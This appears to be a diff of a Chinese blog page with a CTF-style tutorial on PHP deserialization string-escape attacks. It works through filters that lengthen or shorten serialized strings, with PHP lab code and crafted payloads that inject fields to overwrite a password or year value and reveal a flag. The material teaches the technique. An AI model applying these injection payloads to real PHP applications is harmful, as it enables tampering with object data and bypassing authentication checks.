+
+<p>在代码中，当 <code>$pass</code>为 <code>admin</code>时，才会输出 <code>flag</code></p>
+<p>在这里有一个函数 <code>waf</code></p>
+<p><code>waf</code>函数会将 <code>bb</code>变为 <code>ccc</code></p>
+<p>即 <code>bb</code>会变为 <code>ccc</code>，在这个过程中反序列化时便会少读取一个字符</p>
+<p>使用 <code>test.php</code>查看当前序列化结果</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;bb&#x27;</span>, <span class="string">&#x27;ccc&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">		<span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">		<span class="keyword">public</span> <span class="variable">$pass</span> = <span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$c</span> = (<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">A</span>()));</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$c</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/phpUnserialize/s10.png" alt="php_unseriablize10"></p>
+<p>我们要让红线部分的数据修改为 <code>admin</code>，在代码里修改</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;bb&#x27;</span>, <span class="string">&#x27;ccc&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">		<span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">		<span class="keyword">public</span> <span class="variable">$pass</span> = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$c</span> = (<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">A</span>()));</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$c</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/phpUnserialize/s11.png" alt="php_unseriablize11"></p>
+<p>所以我们要逃逸的字符串为 <code>&quot;;s:4:&quot;pass&quot;;s:5:&quot;admin&quot;;&#125;</code></p>
+<p><img src="/phpUnserialize/s12.png" alt="php_unseriablize12"></p>
+<p>按照一个 <code>bb</code>转变为 <code>ccc</code>会逃逸 <code>1</code>个字符，如果我们要逃逸 <code>26</code>个字符，那么我们需要 <code>26</code>个 <code>bb</code></p>
+<p><img src="/phpUnserialize/s13.png" alt="php_unseriablize13"></p>
+<p>所以生成的 <code>name</code>值为 <code>bbbbbbbbbbbbbbbbbbbbbbbbbb&quot;;s:4:&quot;pass&quot;;s:5:&quot;admin&quot;;&#125;</code></p>
+<p>生成 <code>payload</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">	<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;bb&#x27;</span>, <span class="string">&#x27;ccc&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">		<span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;;s:4:&quot;pass&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br><span class="line">		<span class="keyword">public</span> <span class="variable">$pass</span> = <span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;serialize a:&lt;br&gt;&quot;</span> . <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">A</span>()) . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;waf serialize a:&lt;br&gt;&quot;</span> . <span class="title function_ invoke__">waf</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">A</span>())) . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">	<span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">waf</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">A</span>())));</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$c</span>-&gt;pass === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;no no no&quot;</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/phpUnserialize/s14.png" alt="php_unseriablize14"></p>
+<p>可以看到在经过 <code>waf</code>函数后，逃逸后的反序列化长度符合，可以正常反序列化，反序列化 <code>&#125;</code>前的值</p>
+<p>最终改变了 <code>$pass</code>的值获取 <code>flag</code></p>
+<h2 id="PHP反序列化字符串逃逸-变短"><a href="#PHP反序列化字符串逃逸-变短" class="headerlink" title="PHP反序列化字符串逃逸(变短)"></a>PHP反序列化字符串逃逸(变短)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">	<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/ctf|flag/i&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$test</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">	<span class="variable">$test</span>[<span class="string">&#x27;sign&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;sign&#x27;</span>];</span><br><span class="line">	<span class="variable">$test</span>[<span class="string">&#x27;year&#x27;</span>] = <span class="string">&#x27;2021&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="variable">$tmp</span> = <span class="title function_ invoke__">waf</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>));</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span> . <span class="variable">$tmp</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$result</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$tmp</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$result</span>[<span class="string">&#x27;year&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$result</span>[<span class="string">&#x27;year&#x27;</span>] === <span class="string">&#x27;2100&#x27;</span>) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h3><p>首先我们要明确要逃逸的字符串</p>
+<p>在这里要时 <code>year</code>为 <code>2100</code>，所以我们构造 <code>payload</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/ctf|flag/i&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$test</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;cmacckk&#x27;</span>;</span><br><span class="line">	<span class="variable">$test</span>[<span class="string">&#x27;sign&#x27;</span>] = <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line">	<span class="variable">$test</span>[<span class="string">&#x27;year&#x27;</span>] = <span class="string">&#x27;2100&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>) . <span class="string">&quot;     &quot;</span>;</span><br><span class="line">	<span class="variable">$tmp</span> = <span class="title function_ invoke__">waf</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>));</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$tmp</span>;</span><br></pre></td></tr></table></figure>
+
+<p>我们需要逃逸这个部分</p>
+<p><img src="/phpUnserialize/s15.png" alt="php_unseriablize15"></p>
+<h3 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h3><p>我们需要在这个字符串之前添加一个字符或字符串</p>
+<p>这里我添加一个 <code>C</code></p>
+<p>将 <code>sign</code>的值改为 <code>&quot;C;s:4:&quot;sign&quot;;s:4:&quot;test&quot;;s:4:&quot;year&quot;;s:4:&quot;2100&quot;;&#125;</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/ctf|flag/i&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$test</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;cmacckk&#x27;</span>;</span><br><span class="line">	<span class="variable">$test</span>[<span class="string">&#x27;sign&#x27;</span>] = <span class="string">&#x27;C&quot;;s:4:&quot;sign&quot;;s:4:&quot;test&quot;;s:4:&quot;year&quot;;s:4:&quot;2100&quot;;&#125;&#x27;</span>;</span><br><span class="line">	<span class="variable">$test</span>[<span class="string">&#x27;year&#x27;</span>] = <span class="string">&#x27;2100&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);</span><br></pre></td></tr></table></figure>
+
+<p>运行</p>
+<p><img src="/phpUnserialize/s16.png" alt="php_unseriablize16"></p>
+<h3 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h3><p>查看 <code>&quot;;s:4:&quot;sign&quot;;s:48:&quot;C</code>的长度</p>
+<p><img src="/phpUnserialize/s17.png" alt="php_unseriablize17"></p>
+<p>发现长度为 <code>20</code></p>
+<p>在这里的 <code>waf</code>函数中，将 <code>ctf</code>或 <code>flag</code>替换为 <code>&#39;&#39;</code>，所以一个ctf能逃逸 <code>3</code>个字符，一个flag能逃逸 <code>4</code>个字符</p>
+<p>我们需要逃逸 <code>20</code>个字符</p>
+<p>则仅需要 <code>5</code>个 <code>flag</code>即可</p>
+<p><img src="/phpUnserialize/s18.png" alt="php_unseriablize18"></p>
+<p>最终传值结果为</p>
+<p><img src="/phpUnserialize/s19.png" alt="php_unseriablize19"></p>
+<p>参考<a target="_blank" rel="noopener" href="https://www.cnblogs.com/ichunqiu/p/10484832.html">https://www.cnblogs.com/ichunqiu/p/10484832.html</a></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
@@ -177,19 +374,112 @@
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://cmacckk.github.io/2021/06/05/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
-  
-  
-    </div></section>
+
   
 
-    
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+  
+  
+  
+
+  
+
+  
+    <section id="comments">
+      <div id="disqus_thread"></div>
+        <script type="text/javascript">
+        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+        var disqus_shortname = 'cmacckk'; // required: replace example with your forum shortname
+
+        /* * * DON'T EDIT BELOW THIS LINE * * */
+        (function() {
+          var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+          dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+          (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+      </script>
+      <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    </section>
+  
+
+  
 
 
           </div>
@@ -212,8 +502,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: true,
